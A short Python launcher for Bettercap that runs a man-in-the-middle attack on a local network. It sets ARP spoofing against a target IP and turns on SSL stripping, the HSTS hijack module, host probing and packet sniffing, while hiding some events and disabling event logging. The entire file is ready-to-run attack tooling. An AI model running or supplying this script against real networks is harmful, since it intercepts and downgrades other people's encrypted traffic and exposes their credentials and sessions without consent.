#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import os
import sys

# --- CONFIGURATION ---
INTERFACE = "eth0"   
TARGET_IP = ""
VMWARE_HOST = ""

# Bettercap startup commands
commands = [
    f"set net.sniff.skip {VMWARE_HOST}",         # Skip sniffing traffic from the VMware host
    "events.ignore zeroconf.browsing",          # Ignore noisy zeroconf events
    "events.ignore endpoint.new",               # Hide new endpoint notifications
    "events.ignore endpoint.lost",              # Hide lost endpoint notifications
    "set events.stream.output false",           # Disable saving events to a local file
    "set http.proxy.sslstrip true",             # Enable SSL stripping via HTTP proxy
    "hstshijack/hstshijack on",                 # Start the HSTS hijack module
    "net.probe on",                             # Actively probe for new hosts
    "net.recon on",                             # Enable network reconnaissance
    "net.sniff on",                             # Start the packet sniffer
    f"set arp.spoof.targets {TARGET_IP}",       # Set the specific target for ARP spoofing
    "arp.spoof on"                              # Start the ARP spoofing attack
]

def start_attack():
    """
    Formulates the startup string and launches Bettercap via subprocess.
    """
    startup_string = "; ".join(commands)
    
    print("=" * 50)
    print(f"[*] Starting Bettercap on interface: {INTERFACE}...")
    print(f"[*] Target IP: {TARGET_IP}")
    print("[!] Press CTRL+C: Bettercap will disable modules and exit.")
    print("=" * 50)
    
    try:
        # Launching bettercap with sudo, specifying interface and pre-loading commands
        subprocess.run([
            "sudo", "bettercap", 
            "-iface", INTERFACE, 
            "-eval", startup_string
        ])
    except KeyboardInterrupt:
        # Graceful exit on user interruption
        print("\n\n[!] Stopping attack and exiting...")
        sys.exit(0)

if __name__ == "__main__":
    # Check for root privileges before running
    if os.geteuid() != 0:
        print("[-] ERROR: This script must be run with 'sudo' privileges.")
    else:
        start_attack()
